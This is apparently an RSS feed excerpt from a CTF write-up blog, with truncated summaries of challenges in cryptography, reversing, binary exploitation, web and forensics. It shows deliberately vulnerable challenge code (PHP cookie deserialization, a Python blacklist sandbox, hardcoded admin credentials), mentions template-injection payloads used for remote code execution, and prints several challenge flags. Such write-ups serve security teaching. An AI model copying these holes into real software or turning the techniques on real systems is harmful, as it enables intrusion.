$ zsteg pico.flag.png b1,r,lsb,xy .. text: "~__B>wV_G@" b1,rgb,lsb,xy .. text: "picoCTF{7h3r3_15_n0_5p00n_96ae0ac1}$t3g0" b1,abgr,lsb,xy .. text: "E2A5q4E%uSA" b2,b,lsb,xy .. text: "AAPAAQTAAA" b2,b,msb,xy .. text: "HWUUUUUU" b2,a,lsb,xy .. file: Matlab v4 mat-file (little endian) &amp;gt;&amp;lt;?P, numeric, rows 0, columns 0 b2,a,msb,xy .. file: Matlab v4 mat-file (little endian) | &amp;lt;?</description></item><item><title>Stonks</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/stonks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/stonks/</guid><description>We are given the C source code of a binary. The source code is relatively large, so the most interesting function is this one:
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;time.h&amp;gt; #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int buy_stonks(Portfolio *p) { if (!p) { return 1; } char api_buf[FLAG_BUFFER]; FILE *f = fopen("</description></item><item><title>Substitution Cipher</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/substitution-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/substitution-cipher/</guid><description>We are given this encrypted text:
MIT YSAU OL OYGFSBDGRTKFEKBHMGCALSOQTMIOL. UTFTKAMTR ZB DAKQGX EIAOF GY MIT COQOHTROA HAUT GF EASXOF AFR IGZZTL. ZT CTKT SGFU, MIT YSACL GF A 2005 HKTLTFM MODTL MIAF LMADOFA GK A CTTQSB LWFRAB, RTETDZTK 21, 1989 1990, MIT RKTC TROMGKL CAL WHKGGMTR TXTKB CGKSR EAF ZT YGWFR MIT EGFMOFWTR MG CGKQ AM A YAOMIYWS KTHSOTL CITKT IGZZTL, LMBST AOD EASXOF, AMMAEQ ZGMI LORTL MG DAKQL, "</description></item><item><title>Sum-O-Primes</title><link>https://7rocky.github.io/en/ctf/picoctf/cryptography/sum-o-primes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/cryptography/sum-o-primes/</guid><description>We are given the output of an RSA encryption:
x = 17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a We are also given the source code to generate this output. There, we can see that $x = p + q$, $n = p q$ and $c$ is the ciphertext. The exponent $e = 65537$.
RSA background RSA works so that, given a message $m$ in decimal format, we can encrypt it as follows:</description></item><item><title>Symbols</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/symbols/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/symbols/</guid><description>We are given the Python source code used to encrypt the flag:
from secret import FLAG from random import randint p = 307163712384204009961137975465657319439 g = 1337 def encrypt(m): bits = bin(m)[2:] encrypted = [] for b in bits: r = (randint(2, p) &amp;lt;&amp;lt; 1) + int(b) encrypted.append(pow(g, r, p)) return encrypted def main(): flag = int.from_bytes(FLAG, 'big') encrypted_flag = encrypt(flag) with open('output.txt', 'w') as f: f.write(str(encrypted_flag)) if __name__ == '__main__': main() And we also have the output of the script:</description></item><item><title>Taking LS</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/taking-ls/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/taking-ls/</guid><description>We are given a ZIP file that contains these files and directories:
$ unzip -l The\ Flag.zip Archive: The Flag.zip Length Date Time Name --------- ---------- ----- ---- 0 10-30-2016 14:45 The Flag/ 6148 10-30-2016 14:45 The Flag/.DS_Store 0 10-30-2016 14:46 __MACOSX/ 0 10-30-2016 14:46 __MACOSX/The Flag/ 120 10-30-2016 14:45 __MACOSX/The Flag/._.DS_Store 0 10-30-2016 14:40 The Flag/.ThePassword/ 42 10-30-2016 14:41 The Flag/.ThePassword/ThePassword.txt 16647 10-30-2016 14:45 The Flag/The Flag.pdf 177 10-30-2016 14:45 __MACOSX/The Flag/.</description></item><item><title>Tapping</title><link>https://7rocky.github.io/en/ctf/picoctf/cryptography/tapping/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/cryptography/tapping/</guid><description>We are given a strange message from nc:
$ nc jupiter.challenges.picoctf.org 9422 .--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ..--- -.... ---.. ...-- ---.. ..--- ....- -.... .---- ----- } Ncat: Broken pipe. We see that the message has only . and - (and also braces, indicating that the message might be the flag). In fact, the message is Morse code.</description></item><item><title>Tear or Dear</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/tear-or-dear/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/tear-or-dear/</guid><description>We have a Windows PE file called TearOrDear.exe:
$ file TearOrDear.exe TearOrDear.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows If we execute it on a Windows machine, we will see this window form:
C# .NET decompilation Since it is compiled from C# .NET, we can use tools like JetBrains dotPeek, dnSpy or ILSpy to decompile the executable and get almost the original C# source code.
This time, the code is really ugly (I&amp;rsquo;ll leave it here, but it&amp;rsquo;s not necessary to understand everything):</description></item><item><title>Teleport</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/teleport/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/teleport/</guid><description>We have a binary called teleport:
$ file teleport teleport: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1f87fe68fd7d1deaffefcf08ed2b30d660ee2d0b, stripped If we run it, it asks for a password:
$ ./teleport Missing password We can try to add it as a command line argument:
$ ./teleport asdf Something's wrong... $ ./teleport 'HTB{asdf}' Something's wrong... Using ltrace we see that the input is copied at some memory address and then there are a lot of jumps (44 calls to _setjmp):</description></item><item><title>Templated</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/templated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/templated/</guid><description>We are given a website built with Flask:
If we try a random route, it is reflected in the HTML document:
So, if might be probably vulnerable to a Server-Side Template Injection (SSTI). Let&amp;rsquo;s try with {{7*7}}:
And indeed it is vulnerable, because we see 49. Now, we can go to PayloadsAllTheThings and use another SSTI payload to obtain Remote Code Execution (RCE) on the server:
And finally, we get the flag (HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!</description></item><item><title>Testimonial</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/</guid><description>We are given the following website:
Moreover, we have a gRPC endpoint at 94.237.49.166:58578.
We are also given the source code of the project in Go.
Source code analysis This is the main file (main.go):
package main import ( "embed" "htbchal/handler" "htbchal/pb" "log" "net" "net/http" "github.com/go-chi/chi/v5" "google.golang.org/grpc" ) //go:embed public var FS embed.FS func main() { router := chi.NewMux() router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS)))) router.Get("/", handler.MakeHandler(handler.HandleHomeIndex)) go startGRPC() log.Fatal(http.ListenAndServe(":1337", router)) } type server struct { pb.</description></item><item><title>The Magic Informer</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/the-magic-informer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/the-magic-informer/</guid><description>We are given this website:
This time we don&amp;rsquo;t have source code available, so we must poke around with the website.
Registering a new account At the bottom of the page we can find a link to a registration form:
So we can register and then log in:
And we get access to our dashboard:
Directory Traversal and Local File Read We can try common injections in the above form. The key is in the file upload input.</description></item><item><title>The Magic Informer</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/the-magic-informer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/the-magic-informer/</guid><description>We are given this website:
This time we don&amp;rsquo;t have source code available, so we must poke around with the website.
Registering a new account At the bottom of the page we can find a link to a registration form:
So we can register and then log in:
And we get access to our dashboard:
Directory Traversal and Local File Read We can try common injections in the above form. The key is in the file upload input.</description></item><item><title>The Office</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/the-office/</guid><description>We are given a 32-bit binary called the_office:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) The challenge says that they have implemented a secure heap using canaries.
We do not have the C source code. Hence, we need to use a reversing tool like Ghidra.
Although the file is stripped:
$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.</description></item><item><title>The secret of a Queen</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/the-secret-of-a-queen/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/the-secret-of-a-queen/</guid><description>We are given an image with some weird symbols:
The name of the challenge is actually a hint, because there is a cipher used by Mary, Queen of Scots. The cipher is based in a substitution of letters by symbols using this alphabet:
If we translate every symbol on the given image to a letter, we capture the flag: HTB{THEBABINGTONPLOT}.</description></item><item><title>The Three-Eyed Oracle</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/the-three-eyed-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/the-three-eyed-oracle/</guid><description>We are given this Python source code:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random import signal import subprocess import socketserver FLAG = b'HTB{--REDACTED--}' prefix = random.randbytes(12) key = random.randbytes(16) def encrypt(key, msg): msg = bytes.fromhex(msg) crypto = AES.new(key, AES.MODE_ECB) padded = pad(prefix + msg + FLAG, 16) return crypto.encrypt(padded).hex() def challenge(req): req.sendall(b'Welcome to Klaus\'s crypto lab.\n' + b'It seems like there is a prefix appended to the real firmware\n' + b'Can you somehow extract the firmware and fix the chip?</description></item><item><title>The Vault</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/the-vault/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/the-vault/</guid><description>We are given a binary called vault:
$ file vault vault: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, stripped Decompilation Let&amp;rsquo;s open it in Ghidra and decompile it. This is the entry function:
void processEntry entry(undefined8 param_1, undefined8 param_2) { undefined auStack_8[8]; __libc_start_main(FUN_0010c450, param_2, &amp;amp;stack0x00000008, FUN_0010d460, FUN_0010d4d0, param_1, auStack_8); do { // WARNING: Do nothing block with infinite loop } while (true); } So, the &amp;ldquo;main&amp;rdquo; function is FUN_0010c450 (the function name is its address because the binary is stripped), which just calls another one:</description></item><item><title>Time Traveller</title><link>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/time-traveller/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/time-traveller/</guid><description>In this challenge, we are told to find an email address that was shown in the NASA&amp;rsquo;s website (nasa.gov) on December 31, 1996.
The way to find something in a certain date is going to web.archive.org (WayBack Machine):
Here we search for nasa.gov and get a lot of snapshots of the webpage. Curiously, the oldest snapshot is from December 31, 1996:
If we check this snapshot, we see some information. And here we have the email:</description></item><item><title>Tough decisions</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/tough-decisions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/tough-decisions/</guid><description>Champagne for my real friends, real pain for my sham friends.
Challenge contributed by CryptoHack
Challenge files:
output.txt tough_decisions.py Source code analysis We are fiven a Python script that takes the flag as bits and, for each bit, it prints 6 outputs of either the real function (bit 0) or the fake function (bit 1):
if __name__ == "__main__": s = sample_key() for b in get_flag(): print([[real, fake][b](s) for _ in range(6)]) Therefore, the objective is to find a way to differentiate between real and fake outputs in order to learn the bits of the flag.</description></item><item><title>Toxic</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/toxic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/toxic/</guid><description>We are given a website like this:
We are also given the server source code in PHP.
Source code analysis This is index.php:
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); if (empty($_COOKIE['PHPSESSID'])) { $page = new PageModel; $page-&amp;gt;file = '/www/index.html'; setcookie( 'PHPSESSID', base64_encode(serialize($page)), time()+60*60*24, '/' ); } $cookie = base64_decode($_COOKIE['PHPSESSID']); unserialize($cookie); As we can see, the server encodes a page (/www/index.html by default) in the PHPSESSID cookie, and it is also serialized:</description></item><item><title>Trapped Source</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/trapped-source/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/trapped-source/</guid><description>We are given this website:
It looks like a panel where we must enter a PIN.
Inspecting HTML code If we press Ctrl-U on the keyboard, we will see the HTML code of the website:
Surprise! The expected pin is there in clear text: 1425. Let&amp;rsquo;s put it:
Flag And there&amp;rsquo;s the flag:
HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}</description></item><item><title>TrapTrack</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/traptrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/traptrack/</guid><description>We are given a website like this:
We are also given the source code of the project.
Website functionality The web application allows us to enter URLs that will be stored in a SQLite3 database. Just reading the code from challenge/application/config.py, we have valid credentials (admin:admin):
from application.util import generate import os class Config(object): SECRET_KEY = generate(50) ADMIN_USERNAME = 'admin' ADMIN_PASSWORD = 'admin' SESSION_PERMANENT = False SESSION_TYPE = 'filesystem' SQLALCHEMY_DATABASE_URI = 'sqlite:////tmp/database.</description></item><item><title>TrapTrack</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/traptrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/traptrack/</guid><description>We are given a website like this:
We are also given the source code of the project.
Website functionality The web application allows us to enter URLs that will be stored in a SQLite3 database. Just reading the code from challenge/application/config.py, we have valid credentials (admin:admin):
from application.util import generate import os class Config(object): SECRET_KEY = generate(50) ADMIN_USERNAME = 'admin' ADMIN_PASSWORD = 'admin' SESSION_PERMANENT = False SESSION_TYPE = 'filesystem' SQLALCHEMY_DATABASE_URI = 'sqlite:////tmp/database.</description></item><item><title>Tree of Danger</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/tree-of-danger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/tree-of-danger/</guid><description>We are given the Python source code that is being run by the remote instance (util.py):
#!/usr/bin/env python3.10 import ast import math from typing import Union def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool: match type(node): case ast.Constant: return True case ast.List | ast.Tuple | ast.Set: return is_sequence_safe(node) case ast.Dict: return is_dict_safe(node) case ast.Name: return node.id == "math" and isinstance(node.ctx, ast.Load) case ast.UnaryOp: return is_expression_safe(node.operand) case ast.BinOp: return is_expression_safe(node.left) and is_expression_safe(node.right) case ast.</description></item><item><title>Trick or Breach</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/trick-or-breach/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/trick-or-breach/</guid><description>We are given a network traffic capture file called capture.pcap.
Traffic analysis We can use Wireshark to analyze it:
DNS queries All packets are DNS queries (and responses). The thing that stands out is the subdomain: all queries ask for hex-data.pumpkincorp.com.
If we filter by the hexadecimal data on the capture.pcap, we will have this:
$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | head 2504b0304140008080800a52c47550000000000000000000000 2504b0304140008080800a52c47550000000000000000000000 20018000000786c2f64726177696e67732f64726177696e6731 20018000000786c2f64726177696e67732f64726177696e6731 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f Notice that all lines start by 2, which is not part of the subdomain (check the previous image), so we need to get rid of it:</description></item><item><title>Trick or Deal</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/trick-or-deal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/trick-or-deal/</guid><description>We are given a 64-bit binary called trick_or_deal:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we use Ghidra, we will find the following decompiled source code for function main:
undefined8 main(undefined8 param_1, undefined8 param_2) { undefined8 in_R9; setup(); fprintf(stdout, "%s %s Welcome to the Intergalactic Weapon Black Market %s\n", &amp;amp;DAT_0010123c, &amp;amp;DAT_00101241, &amp;amp;DAT_0010123c, in_R9, param_2); fprintf(stdout, "\n%sLoading the latest weaponry .</description></item><item><title>Tsayaki</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/tsayaki/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/tsayaki/</guid><description>We are given the source code of the server in Python:
from tea import Cipher as TEA from secret import IV, FLAG import os ROUNDS = 10 def show_menu(): print(""" ============================================================================================ || I made this decryption oracle in which I let users choose their own decryption keys. || || I think that it's secure as the tea cipher doesn't produce collisions (?) ... Right? || || If you manage to prove me wrong 10 times, you get a special gift.</description></item><item><title>TurboCipher</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/turbocipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/turbocipher/</guid><description>This challenge was made by me for Hack The Box. We are given the Python source code of a server:
#!/usr/bin/env python3 from Crypto.Util.number import bytes_to_long, getPrime, getRandomRange from secret import FLAG, fast_turbonacci, fast_turbocrypt from typing import Callable def turbonacci(n: int, p: int, b: int, c: int) -&amp;gt; int: if n &amp;lt; 2: return n return (b * turbonacci(n - 1, p, b, c) + c * turbonacci(n - 2, p, b, c)) % p def lcg(x: int, m: int, n: int, p: int) -&amp;gt; int: return (m * x + n) % p def turbocrypt(pt: int, k: int, f: Callable[[int], int]) -&amp;gt; int: return sum((f(i + 1) - f(i)) for i in range(k, pt)) def menu() -&amp;gt; int: print('Choose one option') print('1.</description></item><item><title>Twist and shout</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/twist-and-shout/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/twist-and-shout/</guid><description>I&amp;rsquo;ll shout about my curve all day, it&amp;rsquo;s totally secure. You&amp;rsquo;ll have to pull the solution from my cold dead hands!
Challenge contributed by CryptoHack
Connect at archive.cryptohack.org 11718
Challenge files:
twist_and_shout.py Dockerfile twist_and_shout.xinetd We are given a server that uses an elliptic curve to encrypt the flag.
Source code analysis We have the curve parameters:
""" Define the elliptic curve E: y^2 = x^3 + a*x + b With order n = 340282366920938463465004184633952524077 = 2^128 - 1629577202184312621 "</description></item><item><title>TwoForOne</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/twoforone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/twoforone/</guid><description>We are given two public keys in PEM format:
-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxqy430huZnHUpVZIA+HD IUqOJ03grABD7CjIWJ83fH6NMIvD4wKFA4Q0S6eYiIViCkGOatlVV4KE/ATyifEm s4oBgWJRzvmhT9TCSdlraQh/qRsuGtvcgMuW/wzLYSnY9nN9qFDEUfLtP2y2HDaJ Hckk0Kso8mrfDtNXzoSNAv/gCRJxTM9jcsH0EIDoZ0egMD61zfbOkS8RRP1PVXQ8 eWh1oU/f+Pi2YhUMVr5YsJI5dx3ETZaQecStj9mTvGMLeFXS4C6L4Wgk3NWrOBMj HBcxEQqL0CjXod+riS51KUVXuvxxrq9eSNsCZ6bbY9NQ+ZUGjuHK1tMt8RpJvSS6 lwIDAQAB -----END PUBLIC KEY----- -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxqy430huZnHUpVZIA+HD IUqOJ03grABD7CjIWJ83fH6NMIvD4wKFA4Q0S6eYiIViCkGOatlVV4KE/ATyifEm s4oBgWJRzvmhT9TCSdlraQh/qRsuGtvcgMuW/wzLYSnY9nN9qFDEUfLtP2y2HDaJ Hckk0Kso8mrfDtNXzoSNAv/gCRJxTM9jcsH0EIDoZ0egMD61zfbOkS8RRP1PVXQ8 eWh1oU/f+Pi2YhUMVr5YsJI5dx3ETZaQecStj9mTvGMLeFXS4C6L4Wgk3NWrOBMj HBcxEQqL0CjXod+riS51KUVXuvxxrq9eSNsCZ6bbY9NQ+ZUGjuHK1tMt8RpJvSS6 lwIDBTy3 -----END PUBLIC KEY----- And we have also two ciphertexts that match respectively with the above public keys. It is important to say that the message is the same:
RBVdQw7Pllwb42GDYyRa6ByVOfzRrZHmxBkUPD393zxOcrNRZgfub1mqcrAgX4PAsvAOWptJSHbrHctFm6rJLzhBi/rAsKGboWqPAWYIu49Rt7Sc/5+LE2dvy5zriAKclchv9d+uUJ4/kU/vcpg2qlfTnyor6naBsZQvRze0VCMkPvqWPuE6iL6YEAjZmLWmb+bqO+unTLF4YtM1MkKTtiOEy+Bbd4LxlXIO1KSFVOoGjyLW2pVIgKzotB1/9BwJMKJV14/+MUEiP40ehH0U2zr8BeueeXp6NIZwS/9svmvmVi06Np74EbL+aeB4meaXH22fJU0eyL2FppeyvbVaYQ== TSHSOfFBkK/sSE4vWxy00EAnZXrIsBI/Y6mGv466baOsST+qyYXHdPsI33Kr6ovucDjgDw/VvQtsAuGhthLbLVdldt9OWDhK5lbM6e0CuhKSoJntnvCz7GtZvjgPM7JDHQkAU7Pcyall9UEqL+W6ZCkiSQnK+j6QB7ynwCsW1wAmnCM68fY2HaBvd8RP2+rPgWv9grcEBkXf7ewA+sxSw7hahMaW0LYhsMYUggrcKqhofGgl+4UR5pdSiFg4YKUSgdSw1Ic/tug9vfHuLSiiuhrtP38yVzazqOZPXGxG4tQ6btc1helH0cLfw1SCdua1ejyan9l1GLXsAyGOKSFdKw== The public keys look very similar. Let&amp;rsquo;s import them with Python and check $n$ and $e$:</description></item><item><title>Type Exception</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/type-exception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/type-exception/</guid><description>We are given this Python script that is executed in the remote instance:
#!/usr/bin/env python3 import re with open("./flag.txt") as f: FLAG = f.read().strip() BLACKLIST = '"%&amp;amp;\',-/_:;@\\`{|}~*&amp;lt;=&amp;gt;[] \t\n\r\x0b\x0c' OPEN_LIST = '(' CLOSE_LIST = ')' def check_balanced(s): stack = [] for i in s: if i in OPEN_LIST: stack.append(i) elif i in CLOSE_LIST: pos = CLOSE_LIST.index(i) if ((len(stack) &amp;gt; 0) and (OPEN_LIST[pos] == stack[len(stack)-1])): stack.pop() else: return False return len(stack) == 0 def check(s): if re.</description></item><item><title>Unique</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/unique/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/unique/</guid><description>We are told that a vehicle is sending the VIN (Vehicle Identificacion Number) and they saved the signal capture in a file (trace_captured.sal). We need to find the VIN.
Initial recognition We can open trace_captured.sal with Saleae Logic2:
At first, we can select &amp;ldquo;Async Serial&amp;rdquo; and test some bitrates:
As we can see, the dots don&amp;rsquo;t fit with the signal pulses. We can do some calculation to see what is the correct bitrate:</description></item><item><title>Unsubscriptions Are Free</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/</guid><description>We are given a 32-bit binary called vuln:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) We also have the C source code:
#include &amp;lt;stdint.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;ctype.h&amp;gt; #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr() { char buf[FLAG_BUFFER]; FILE *f = fopen("</description></item><item><title>Up a Stream</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/up-a-stream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/up-a-stream/</guid><description>We have a JAR file called stream.jar and an output.txt:
